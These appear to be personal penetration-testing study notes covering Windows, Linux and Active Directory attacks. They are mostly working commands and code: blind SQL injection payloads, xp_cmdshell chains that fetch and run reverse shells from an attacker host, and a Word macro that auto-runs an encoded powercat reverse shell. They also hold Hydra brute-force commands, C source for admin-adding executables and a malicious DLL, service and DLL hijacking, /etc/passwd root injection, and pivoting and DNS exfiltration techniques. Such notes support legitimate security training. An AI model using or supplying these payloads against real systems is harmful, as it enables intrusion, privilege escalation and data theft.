' IF(ASCII(SUBSTRING((SELECT username FROM webapp.dbo.users ORDER BY username OFFSET {offset}
ROWS FETCH NEXT 1 ROWS ONLY),{position},1))={ascii_val}) WAITFOR DELAY '0:0:5'-- -)
```
//extract username from users table in WEBAPP db -- nothing
```
' IF((SELECT COUNT(*) FROM webapp.dbo.users) > 0) WAITFOR DELAY '0:0:5'-- -
```
//check if data exists in users table in webapp db -- and no

```
' if (ascii(substring((@@version),{position},1)) = {ascii_val}) waitfor delay '0:0:5'-- -
```
//extract version -- Microsoft SQL Server

```
' if (ascii(substring((user),{position},1)) = {ascii_val}) waitfor delay '0:0:5'-- -
```
//dbo
```
' if (ascii(substring((select db_name()),{position},1)) = {ascii_val}) waitfor delay '0:0:5'-- -
```
//webapp
```
' if (ascii(substring((select host_name()),{position},1)) = {ascii_val}) waitfor delay '0:0:5'-- -
```
//WINSERV22-TEMP
```
' if (ascii(substring((select system_user),{position},1)) = {ascii_val}) waitfor delay '0:0:5'-- -
```
//sa

```
' if (ascii(substring((select name from master..syslogins order by name offset {offset} rows fetch next 1 rows only),{position},1)) = {ascii_val}) waitfor delay '0:0:5'-- -
```
//list users

```
sudo tcpdump -i tun0 icmp
```
```
'%3bexec+sp_configure+'show+advanced+options',1%3breconfigure%3bexec+sp_configure+'xp_cmdshell',1%3breconfigure%3bexec+xp_cmdshell+'ping+-c+5+192.168.xx.xxx'%3b--+-
```
//tried enabling xp_cmdshell to give us a ping -- but not working
```
sudo responder -I tun0
```
```
'; use master; exec xp_dirtree '\\192.168.xx.xxx\SHARE';-- -
```
//tried xp_dirtree as well -- got nothing back

```
'; EXEC sp_OACreate 'WScript.Shell', @shell OUT; EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c net use \\192.168.xx.xxx\share';-- -
```
//tried sp_OACreate -- but got nothing back

```
';EXEC sp_configure 'show advanced options', 1; RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; EXEC xp_cmdshell 'powershell -c "iwr http://192.168.xx.xxx/powercat.ps1 -outf \programdata\cat.ps1"';-- -
```
```
';EXEC sp_configure 'show advanced options', 1; RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; EXEC xp_cmdshell 'powershell -c “iwr http://192.168.xx.xxx/revpwrshll.bat -outf \programdata\rev.bat”'-- -
```
```
';EXEC sp_configure 'show advanced options', 1; RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; EXEC xp_cmdshell 'powershell \programdata\rev.bat'-- -
```

OR

```
'; EXEC sp_configure 'show advanced options', 1;reconfigure; exec sp_configure 'xp_cmdshell', 1;reconfigure;
exec xp_cmdshell 'powershell -nop -exec bypass -c "iwr http://192.168.xx.xxx/revpwrshll.bat -outf \programdata\rev.bat; \programdata\rev.bat"'-- -
```
//chained commands/one-liner works too

```
'; exec xp_cmdshell 'powershell -nop -exec bypass -c "iex(iwr http://192.168.xx.xxx/rev.ps1 -
usebasicparsing)"'-- -
```
//this iex(iwr -useb) -- got thru when downloadstring couldnt!
//it's less signaure-heavy


##### LESSONS LEARNED
```
xp_cmdshell '\\192.168.xx.xxx\share'
```
OR
xp_cmdshell 'ping -c 4 192.168.xx.xxx'
//if these fail -- don't mean it's over -- try powershell too!!

```
xp_cmdshell 'powershell -c “iwr http://192.168.xx.xxx/revpwrshll.bat -outf \programdata\rev.bat”'
```
//rev.bat is essentially a powershell one-liner -- make sure ip and port direct traffic to us

```
xp_cmdshell 'powershell \programdata\rev.bat'
```
```
curl -X POST "http://192.168.144.50/login.aspx" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "__VIEWSTATE=/wEPDwUKMjA3MT.....tGtg/P/yY/9wvvPLFKzxx1KQ5PYkQ==" \
--data-urlencode "__VIEWSTATEGENERATOR=C2...B" \
--data-urlencode "__EVENTVALIDATION=/wEdAA....OsOsW4EtI0XDMY3uBxZiCrp80=" \
--data-urlencode "ctl00$ContentPlaceHolder1$UsernameTextBox='+if+(is_srvrolemember('sysadmin') =
1)+waitfor+delay+'0:0:5'--+-" \
--data-urlencode "ctl00$ContentPlaceHolder1$PasswordTextBox=" \
--data-urlencode "ctl00$ContentPlaceHolder1$LoginButton=Login"
```
//could use curl instead of burp





---
### WORD MACRO REV SHELL

```
iex(new-object net.webclient).downloadstring("http://192.168.45.248/powercat.ps1");powercat -c 192.168.xx.xxx -p 8888 -e powershell
```
//base64 this
//make sure its UTF-16LE which is what powershell supports
```
pwsh
```
```
$text = 'iex(new-object net.webclient).downloadstring("http://192.168.45.248/powercat.ps1");powercat -c
192.168.45.248 -p 8888 -e powershell'
```
```
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
```
```
$EncodedText =[Convert]::ToBase64String($Bytes)
```
```
$EncodedText
```
//and got this aQBlAHgAKABuAG....oAGUAbABsAA==
//now make it into a split chunk with python
```
python3
```
```
str = “powershell.exe -nop -w hidden -e <base64 code>”
n = 50
for i in range(0, len(str), n):
print("Str = Str + “ + '”' + str[i:i+n] + '"')
```
```
//and get this
Str = Str + "powershell.exe -nop -w hidden -e aQBlAHgAKABuAGUAd"
Str = Str + "wAtAG8AYgBqAG.......................GUAYgBjAGwAaQB"
Str = Str + "lAG4AdAA.......................................BnA"
Str = Str + "Cg..............................................DU"
Str = Str + "G....................ABsAA=="
```
#### COMPLETE MACRO REV SHELL IN VBA
```
Sub AutoOpen()
mymac
End Sub
Sub Document_Open()
mymac
End Sub
Sub mymac()
Dim Str As String
Str = Str + "powershell.exe -nop -w hidden -e aQBlAHgAKABuAGUAd"
Str = Str + "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
Str = Str + "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
Str = Str + "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
Str = Str + "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
Str = Str + "xxxxxxxxxxxxxx=="
CreateObject("Wscript.Shell").Run Str
End Sub
```





---
### HYDRA

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.xx.xxx
```
```
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.xx.xxx
```
```
hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.xxx.xxx
```
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.xxx.xx http-post-form "/index.php:fm_usr=user&fm_
pwd=^PASS^:Login failed. Invalid"
```
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.xx.xxx http-get
```
//auth box pops up when accessing main page with GET request -- no post request body -- so use http-get option
//downsides: generate a lot of noise in the network -- and could lock out a user after 3 or so password attempts


---
### ENCRYPTION VS HASHING

- encryption is a 2 way functions -- meant to be decrypted
- hashing is a one-way function -- NOT meant to be cracked


#### SYMMETRIC ENCRYPTION
- e.g. AES
- only 1 key (passwd) and both parties are required to know before communication can be established
- same key for both encryption and decryption


#### ASYMMETRIC ENCRYPTION
- e.g. RSA
- utilizes distinct key pairs -- private and public keys -- each user has both private and public keys
- userA publishes or provides his pub key to userB -- so userB can encrypt her message with userA's pub key -- userA can
then decrypt the message using his private key.


#### HASHING
- hashing algorithms e.g. MD5, SHA1, SHA256
- often used with plaintext passwd
- a plaintext passwd or variable sized input data like a file filled with data is ran thru a hash algorithm like SHA1 --
resulting in UNIQUE and fixed-length hex value that represents the original plaintext
- a plaintext ran thru a specific hashing algo always produce the same hash
- and a slight change in plaintext would result in an entirely different hash
- a hash collision can occur but is extremely rare
- when a user logs in to a site -- their plaintext passwd is hashed -- then COMPARED with their existing hash in the
database



### JOHN VS HASHCAT
- john is CPU-based
- hashcat is GPU-based
- bcrypt is better with CPU cracking




### HASH CRACKING TIME
- cracking time = [key space] / hash rate
- keyspace = character set ^ length of characters
- For example, if we use the lower-case Latin alphabet (26 characters), upper case alphabet (26 characters), and the
numbers from 0 to 9 (10 characters), we have a character set of 62 possible variations for every character. If we are
faced with a five-character password, we are facing 62 to the power of five possible passwords containing these five
characters.
- `echo -n 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' |wc -c`
//62
- `python3 -c 'print(62**5)'`
- Now that we have the keyspace in the context of this example, we also need the hash rate to calculate the cracking
time. The hash rate is a measure of how many hash calculations can be performed in a second. We can use Hashcat's
benchmark mode to determine the hash rates for various hash algorithms on our particular hardware.We'll use
hashcat with -b to initiate benchmark mode. First, we'll benchmark a CPU by running it in a Kali VM without any GPUs
attached. These results may differ on various systems
```
hashcat -b
```
Algorithm GPU CPU
MD5 68,185.1 MH/s 450.8 MH/s
SHA1 21,528.2 MH/s 298.3 MH/s
SHA256 9,276.3 MH/s 134.2 MH/s
```
python3 -c "print(916132832 / 134200000)"
```
//6.826623189269746
```
python3 -c "print(916132832 / 9276300000)"
```
//0.09876058687192092
```
python3 -c "print(62**10)"
```
//839299365868340224
```
python3 -c "print(839299365868340224 / 9276300000)"
```
//got 90477816.14095493
- so around 2.8 years for a 10 character passwd for a gpu
- Note that increasing password length increases cracking duration by exponential time, while increasing password
complexity (charset) only increases cracking duration by polynomial time -- This implies that a password policy
encouraging longer passwords is more robust against cracking, compared to a password policy that encourages
more-complex passwords
- NOTE: LONGER PASSWD > MORE COMPLEX PASSWD




---
### JOHN WITH RULES
```
ssh2john id_rsa-dave > id_rsa-dave.hash
```
```
vim dave.rule
```
```
[List.Rules:daveRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
```
```
sudo sh -c 'cat dave.rule >> /etc/john/john.conf'
```
```
john --wordlist=dave-pass.txt --rules=daveRules id_rsa-dave.hash
```


---
### WINDOWS SID
S - R -X -Y
- S for SID
- R for revision -- set to 1 always
- X Identifier Authority --normally set to 5 for NT Authority -- used for local or domain users and groups
- Y for Sub-Authority -- consists of domain identifier and relative identifier (RID)
- domain identifier == SID of the domain for domain users, SID for the local machine for local users, and “32” for builtin



#### Principals
- RID determines principals such as users or groups
- RID starts at 1000 for nearly all principals
```
S-1-5-21-1336799502-1441772794-948155058-1001
```
//this implies that this SID belongs to the second local user on the system
```
S-1-0-0 Nobody
S-1-1-0 Everybody
S-1-5-11 Authenticated Users
S-1-5-18 Local System
S-1-5-domainidentifier-500 Administrator
```
//RID below 1000 are well-known SIDs





---
### MANDATORY INTEGRITY CONTROL
- high integ level > lower integ ones
- processes and objects inherit integ levels from the user who creates them
```
icacls
```
//check files' integ level
```
whoami /groups
```
//check user's integ level




---
### UAC
//UAC assigned 2 access tokens to administrator -- standard user token to be used at default and admin token to be
used only when privileged actions are required



---
### WINDOWS PRIVESC ENUMERATION

//key pieces of info one should always try to obtain
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

```
whoami
```
//gets us both username and hostname

```
whoami /groups
```
//get groups

```
net user
get-localuser
```
```
net localgroup
get-localgroup
```
//remote desktop users == RDP
//remote managetment users == WINRM

```
get-localgroupmember adminteam
get-localgroupmember administrators
```

```
systeminfo
```
//get OS, version, and architecture

```
ipconfig /all
```
//grab network info

```
route print
```
//contains all routes to the system -- useful in determining possible attack vectors to other systems or networks

```
netstat -ano
```
- -a for all active tcp connections
- -n disable name resolution
- -o show process ID
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
//display installed 32-bit applications

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
//display installed 64-bit applications
//then check for any public exploits on a particular ver that's got installed here
get-process
//check running processes

```
get-process -name nonstandardprocess | select-object name, path
```
//list out path of this unusual process
```
get-ciminstance win32_process | select-object name,executablepath
```
//an alternative to get-process and perhaps get-wmiobject

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | selectstring
"OS{"
```
//use select-string just like GREP
```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
```
Get-ChildItem -Path C:\users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ps1 -File -Recurse -ErrorAction
SilentlyContinue
```
```
tree . /f /a
```
//tree command really comes in useful to help visualize the files in a directory and its sub directories

```
get-content
```
//powershell's cat
//my.ini in mysql could contain creds

```
get-history
(get-psreadlineoption).historysavepath
get-content C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
```
//if we see this start-transcript -- we wanna check out its transcript file

```
icacls
```
//list permissions



=====================
SERVICE BINARY HIJACKING
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like
'Running'}
//search for potentially hijackable service bianries
//get-service works too
icacls "C:\xampp\apache\bin\httpd.exe"
icacls C:\xampp\mysql\bin\mysqld.exe
//can sneak in our malicious mysqld.exe -- in this case we'd have it create another user and be added as administrator
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
net stop mysql
net start mysql
//but if permission is denied we gotta find another way
//if it's set to auto + we got shutdownpriv -- we can still exploit this
shutdown /r /t 0
// /t for time 0
get-localgroupmember administrators
//and we're admin
//now log in as the new admin user we just added


---
### ADDUSER.C

```
#include <stdlib.h>

int main() {
    int i;
    i = system("net user dave2 password123! /add");
    i = system("net localgroup administrators dave2 /add");
    return 0;
}
```

```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```


---
### DLL HIJACKING

//similar to service binary hijacking - -but instead we overwrite a DLL that service binaries use.
#### first method -- hijack DLL search order.
- The directory from which the application loaded.
- The system directory.
- The 16-bit system directory.
- The Windows directory.
- The current directory.
- The directories that are listed in the PATH environment variable.

//however -- When safe DLL search mode is disabled, the current directory is searched at position 2 after the
application's directory

#### 2nd method -- place a missing DLL into the path of the DLL search order

//make sure our malicious file got the same name

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
//first check installed apps
//we see filezilla -- according to research this version is vulnerable to dll hijacking

```
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
```
//check if we have write perm over it -- icacls works too
//use ProcMon to make sure DLL is not present
```
filter -> process name is filezilla.exe -> include -> add
operation is createfile -> include -> add
path contains textshaping.dll -> include -> add
```
//then we see NAME NOT FOUND in path \file zilla\filezila ftp client\textshaping.dll
```
vim adduser-dll.cpp
```
//we create a malicious textshaping.dll

```
x86_64-w64-mingw32-gcc adduser-DLL.cpp --shared -o adduser.dll
```
//compile it
```
iwr http://192.168.xx.xxx/adduser.dll -outf 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```
//send it over to target
//now we wait and hope someone with high priv comes and runs filezilla

```
net localgroup administrators
```
//after a few mins we check -- and here we go our new user has been added
//now we log in as our new admin user and grab the flag




---
#### ADDUSER VIA DLL

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
    HANDLE hModule, // Handle to DLL module
    DWORD ul_reason_for_call, // Reason for calling function
    LPVOID lpReserved // Reserved
) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        {
            int i;
            i = system("net user dave8 password888! /add");
            i = system("net localgroup administrators dave8 /add");
            break;
        }
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
            break;
        case DLL_THREAD_DETACH: // A thread exits normally.
            break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
    }
    return TRUE;
}
```

---
### UNQUOTED SERVICE PATHS

//When Windows starts the service, it will use the following order to try to start the executable file
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```
- in the context of the above -- realistically we would have perm to write or modify in My Service dir -- the first two we wouldnt have perms to them by default
- often times it would be LocalSystem account that executes these services -- giving us a priv esc
```
get-ciminstance win32_service | select name,state,pathname
```
OR
```
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v '"'
```
- and found C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe -- without proper quotes
- A more effective way to identify spaces in the paths and missing quotes is using the WMI command-line (WMIC)
utility. We can enter service to obtain service information and the verb get with name and pathname as arguments to
retrieve only these specific property values. We'll pipe the output of this command to findstr with /i for case-insensitive searching and /v to only print lines that don't match. As the argument for this command, we'll enter "C:\Windows\" to show only services with a binary path outside of the Windows directory. We'll pipe the output of this command to another findstr command, which uses """ as argument to print only matches without quotes.
```
start-service GammaService
```
```
stop-service GammaService
```
//check if we can stop and start service
OR
```
sc start GammaService
```
```
sc stop GammaService
```
//same thing in cmd.exe

```
icacls "C:\Program Files\Enterprise Apps"
```
//we got W so we're good

```
iwr http://192.168.45.222/adduser.exe -outf 'C:\Program Files\Enterprise Apps\Current.exe'
```
//so now we need current.exe -- perhaps to add an admin user for us
```
start-service GammaService
```
//it throws an error -- however

```
net user
```
//we regardless see our new admin user -- dave2
//make sure to restore binaries back to normal after exploiting


#### ABUSING SERVICEUNQUOTED VIA POWERUP
//iwr powerup.ps1 over first
```
powershell -ep bypass
. .\powerup.ps1
```
```
get-unquotedservice
```
//or get-serviceunquoted -- it would also output abuse commands

```
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```
//here we sneak in Current.exe that would add our own admin user
```
restart-service gammaservice
```
//it might throw an error but dont be disheartened it likely worked
net user
//check if we've got our new user


---
### SCHEDULED TASKS
```
get-scheduledtask
```
OR
```
schtasks /query /fo LIST /v
```
//fo for output format and /v for displaying properties as well
```
schtasks /query /fo LIST /v | select-string <user>
```
//if output is overwhelming -- try grepping the name of our user -- cause there's a likelihood writable path is in our dir


---
### WINDOWS PRIV -- IMPERSONATEPRIV

- standard users rarely have it assigned
- IIS often has seimpersonate priv assigned -- so if we got in via web server we likely will have seimpersonate priv
- SigmaPotato makes use of seimpersonate priv and named pipe to get us a SYSTEM shell
- iwr it over to target
```
.\sigmapotato.exe “net user dave8 Davepass /add”
```
```
net user
```
//check if hes been added
```
.\sigmapotato “net localgroup Administrators tool /add”
```
```
net localgroup Administrators
```
//check



---
### LINUX PRIVESC

//everything is a file
```
id
```
//always run id command first -- to know who we are and what groups were in

```
cat /etc/passwd | grep 'sh'
```
//enum users

```
hostname
cat /etc/issue
cat /etc/os-release
```
// Debian 10 -- buster

```
uname -a
```
//kernel ver 4.19.0 -- x86_64
//look for os release and ver and kernel ver and architecture-- for kernel exploit search

```
find / -perm -u=s -type f -ls 2>/dev/null
```
//check suid

```
sudo -l
```
//check sudo rights

```
ps auxww
```
//cheeck processes for potential pivoting
```
ip a
```
//check network tcp/ip config
//may be connected to more than one network

```
route
routel
```
//display network routing table

```
netstat -pant
ss -tunlp
```
//check active network connection -- and listening ports

```
iptables
```
//requires root priv -- to view firewall rules

```
cat /etc/iptables/rules.v4
```
//but we can try catting this out


```
crontab -l
```
//view current user's scheduled jobs

```
cat /etc/cron*
grep 'CRON' /var/log/syslog
```
//check potential cronjobs running
```
grep '<user> /var/log/syslog
```
//check for our own user name

```
dpkg -l
```
//list programs installed by dpkg

```
find / -writable -type d -ls 2>/dev/null
```
//find writable directories

```
cat /etc/fstab
```
//check drives that will be mounted at boot time

```
mount
```
//list all mount filesystems

```
lsblk
```
//view all available disks

```
lsmod
```
//check loaded kernel modules
//if we see smth interesting -- say libata we use modinfo
/sbin/modinfo libata




---
### ABUSING /ETC/PASSWD
```
ls -la /etc/passwd
```
//if perm isnt properly set

```
openssl passwd p@ssWd
```
//get a hash in crypt format -- good for linux
```
echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
OR
echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd
```




---
### SSH PORT FORWARDING


#### SSH LOCAL PORT FORWARDING

```
ssh -N -L 0.0.0.0:4455:172.16.xxx.xxx:445 database_admin@10.4.xxx.xxx
```
- on WEB machine we run ssh to local port forward port 445 SMB -- so our kali can access
- -N for no shell
- make sure to include 0.0.0.0 or it wouldnt connect
- make sure we point to WEB ip -- not the actual target further in
- specify port or it wouldnt connect


**RECAP
//we got 4 machines -- kali ↔ WEB ↔ POSTGRES ↔ HR
//ssh local forwarding is ran on the 2nd machine -- WEB -- pointing at HR -- via POSTGRES
//then kali connect to WEB to access HR


#### SSH DYNAMIC PORT FORWARDING
//4 networks: KALI ↔ WEB ↔ POSTGRES ↔ HRSHARES
```
sudo vim /etc/proxychains4.conf
```
```
sock5 192.168.xxx.xx 1080
```
//use <WEB ip> NOT 127.0.0.1
```
ssh -N -D 0.0.0.0:1080 database_admin@10.4.xxx.xxx
```
//run -D port forward on WEB -- while ssh into POSTGRES

```
proxychains4 nmap -Pn -sT --top-ports=20 172.16.xxx.xxx -vvv
```
- thru proxychains -- here make sure to specify the actual target HRSHARES -- NOT WEB
- By default, Proxychains is configured with very high time-out values. This can make port scanning really slow.
- Lowering the tcp_read_time_out and tcp_connect_time_out values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning
times
- if nmap takes too long just use nc for a shallow scan
- when in doubt about a program -- use -h option to see what we can do


#### SSH REMOTE PORT FORWARDING
//first make sure our server is open
```
systemctl status ssh
systemctl start ssh
```
//might need to restart it if changes are made in /etc/ssh/sshd_config
//note that sshd_config is for server config -- ssh_config is for client
```
systemctl restart ssh
```
//KALI ↔ WEB ↔ POSTGRES
```
ssh -N -R 127.0.0.1:2345:10.4.xxx.xxx:5432 kali@192.168.xx.xxx -vvv
```
//here we run this command on the WEB -- forward port 5432 of POSTGRES machine to our KALI locahost --
specifying our own ip to connect to our server -- note that so ip of WEB is mentioned here -- but we run this command
on WEB



#### SSH DYNAMIC REMOTE PORT FORWARDING
- Machines: KALI ↔ WEB ↔ MULTISERVER ↔ MULTISERVER-INTERNAL
- 3 hops from KALI
```
vim /etc/proxychains4.conf
```
```
socks5 127.0.0.1 1080
```
//make sure our ssh server is open
```
systemctl start ssh
systemctl status ssh
```
```
ssh -N -R 1080 kali@192.168.xx.xxx -vvv
```
//on WEB we run this ssh client
```
proxychains nmap -Pn -sT -p 9050-9100 10.4.xxx.xx -vvv
```
//on kali we run nmap to scan the internal network of MULTISERVER -- all the way in -- 3 hops -- Note here that we
specify the actual target ip
```
proxychains4 ./ssh-remote-dynamic-client -i 10.4.xxx.xx -p 9062
```



#### WINDOWS PORT FORWARDING WITH SSH.EXE
//with remote dynamic -- set ups are like on linux
//make sure our server is up
//make sure we set up /etc/proxychains4.conf
```
where ssh.exe
```
//like which for linux
//on target run
```
ssh.exe -N -R 1080 kali@192.168.xx.xxx -vvv
```
//or change port if session was not properly cleaned up -- could cause connectivity issue
```
proxychains4 psql -h 10.4.xxx.xxx -U postgres
```
//note that we specify actual target ip -- and no need to specify port -- just like on linux





---
### DNS TUNNELING
//essentially dns server query ip addresses for us when we type a name of a website -- A record that contains ipv4
addresses
//more specifically a DNS Recursive Resolver does the query for us -- for a normal user -- our ISP normally does this
//once the recursive resolver got a request from us -- it
1. queries root name servers --to get top-level domain name server(TLD) responsible
2. queries TLD name server -- to get authoritative name server responsible
3. queries authoritative name server -- to finally get the the ipv4 address
//this happens via port udp53



#### EXFIL

- this shows that it is possible to exfiltrate data from an internal host with no outgoing network activity -- just by
making dns queries
- what happened was an exfil of a small chunk of data --but exfiltrating a larger binary file would require a series of
sequential requests
1. convert abinary file into a long hex string representation
2. split this stringinto a series of smaller chunks
3. send each chunk in a DNS request for [hex-string-chunk].k9.corp.
4. On the server side, log all the DNS requests
5. and convert them from a series of hex stringsback to a full binary



#### INFIL

//now to infiltrate data -- we can make use of TXT record --designed to be general-purpose and contains string data
//here we can server TXT record from FELINE via dnsmasq
```
cat dnsmasq_txt.conf
```
```
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts
# Define the zone
auth-zone=k9.corp
auth-server=k9.corp
# TXT record
txt-record=www.k9.corp,here's something useful!
txt-record=www.k9.corp,here's something else less useful.
```
```
sudo dnsmasq -C dnsmasq_txt.conf -d
```
//run it
```
nslookup -type=txt www.k9.corp
```
//and we got txt record in dnsmasq_txt.conf back
//note that if we change the url to something else like a subdomain tool.k9.corp -- it would return NXDOMAIN
//this is infiltrating string data -- for binaries we could convert them to base64 or ASCII hex encoded TXT records







---
### MSF 

#### MSF AUTOROUTE
```
bg
```
//we could use autoroute to automate
```
use multi/manage/autoroute
set session 1
run
```
//and successfully added the new subnet to the routing table -- we could now run psexec like earlier -- or we could
combine routes with socks proxy
```
use auxiliary/server/socks_proxy
show options
set srvhost 127.0.0.1
set version 5
set srvport 1080
run -j
```
//run as jobs in the bg
//make sure /etc/proxychains.conf is set to -- socks5 127.0.0.1 1080
```
proxychains4 xfreerdp3 /u:luiza /p:"Boxxxxxxxxow1!" /v:172.16.xx.xxx /cert:ignore /dynamic-resolution
+clipboard
```
//notice here we use actual target ip
//takes awhile
//and got in


#### MSF MANUAL PORTPWD

//another way of achieving the same results is via portfwd module
```
sessions -i 1
portfwd -h
portfwd add -l 3389 -p 3389 -r 172.16.xx.xxx
```
//forward port 3389 on localhost to 3389 on target
```
xfreerdp3 /u:luiza /p:"Boxxxxxxxxxxow1!" /v:127.0.0.1 /cert:ignore
```
//note here we point the target to our localhost
//and a success






### ACTIVE DIRECTORY

#### ACTIVE DIRECTORY ENUMERATION


Active Directory (AD) is Microsoft’s directory service for centralized identity and access management.
AD objects include users, groups, computers, OUs, domains, and policies.

##### OUs
- Organizational Units are containers for AD objects.
- OUs are like folders for organizing users, computers, and groups.
- Computer objects represent domain-joined servers and workstations.
- User objects represent accounts used to log into domain-joined systems.
- User objects contain attributes such as username, first name, last name, email, and phone.

##### Domain Controllers
- DCs respond to logon requests and usually host DNS for the domain.
- Domain Admins are some of the highest-privileged users in a domain.
- Domains can exist within a domain tree, and domain trees can form a forest.
- Enterprise Admins control the entire forest.
- Many AD enumeration techniques rely on LDAP.

##### ENUM WORKFLOW
- Enumerate as a low-privileged user.
- Gather information about additional users and computers.
- Repeat enumeration from a new user or after pivoting.
- Re-run enumeration as access increases or scope changes.

##### MANUAL ENUM

- Use legacy Windows tools like `net.exe` for basic domain enumeration.
- Use PowerShell and .NET to query AD via LDAP.
- When you have AD credentials, use RDP when possible to avoid Kerberos double-hop issues.
```powershell
xfreerdp3 /cert:ignore /u:stephanie /p:'LegmanTeamBenzoin!!' /d:corp.com /v:192.168.132.75 /dynamicresolution +clipboard
net user
net user /domain
net user jeffadmin /domain
net localgroup
net localgroup "remote desktop users"
net group /domain
net group "domain admins" /domain
```
`Get-ADUser` is powerful, but usually requires RSAT and is often installed only on a DC.

LDAP path format:
```text
LDAP://HostName[:PortNumber][/DistinguishedName]
```
- `HostName`: computer name, IP address, or domain name. Prefer the primary DC/PDC.
- `PortNumber`: optional when using a non-default LDAP port.
- `DistinguishedName`: uniquely identifies an AD object.

Example DN:
```text
CN=Stephanie,CN=Users,DC=corp,DC=com
```
- `CN` = common name
- `DC` = domain component

AD DNs are typically read from right to left.

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

// This shows the current domain, and the primary DC usually holds the PdcRoleOwner role.



#### POWERVIEW

PowerView is a PowerShell module for AD enumeration.

```powershell
. .\powerview.ps1
Get-NetDomain
Get-NetUser
Get-NetUser | Select CN
Get-NetUser | Select CN, pwdLastSet, lastLogon
Get-NetGroup | Select CN
Get-NetGroup "domain admins" | Select Member
Get-NetComputer | Select OperatingSystem
Get-NetComputer "files04" | Select DistinguishedName, OperatingSystemVersion
```



#### PERMISSIONS AND LOGGEDON USERS

- When a user logs into a domain, their credentials are cached locally on that computer.
- These cached credentials are a common target for credential theft.
- Domain admins are the main goal, but service accounts and other domain users may provide alternate attack paths.
```powershell
powershell -ep bypass
. .\powerview.ps1
Find-LocalAdminAccess
Get-NetSession -ComputerName files04 -Verbose
Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-NetComputer | Select DNSHostName, OperatingSystem, OperatingSystemVersion
```

```powershell
.\PsLoggedOn.exe \\files04
.\PsLoggedOn.exe \\client74
```

- `PsLoggedOn` requires remote registry access.
- If you're local admin on a host, you may be able to enumerate sessions or retrieve credentials from that system.









---
### SHARPHOUND && BLOODHOUND
- sharphound collects data
- then bloodhound analyzes data -- and graphs them
```
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp
audit"
```

```
sudo neo4j
bloodhound
```
//check outbound rights -- path to domain admins -- path to high value target




---
### NTLM AUTHENTICATION
//used when auth to server with ip -- instead of hostname
essentially:
1. client auths -- sends username
2. server responds with nonce
3. client encrypts nonce with its ntlm hash -- sends it back to server
4. server passes everything -- username, nonce , response (ntlm-encrypted nonce) -- over to DC
5. DC encrypts nonce with user hash from its db -- then compare it to the response passed over by the server
6. DC approves or denies
//but ntlm is considered weak -- fast-hashing algo -- short passwords can be cracked in mere seconds with modest
equipment




---
### KERBEROS AUTHENTICATION

- primary method of windows auth
- utlizes ticket system -- as opposed to ntlm that uses challenge(nonce) and response
- auths to the KDC service on DC




#### Kerberos Auth protocol:

##### TGT
1. client logs in -- AS-REQ containing a -- 1) timestamp --encrypted with user passwd hash -- and 2) username --
sent to KDC
2. KDC receives the AS-REQ -- looks up the user's hash in ntds.dit --then decrypts the timestamp with the hash --
then approves or denies
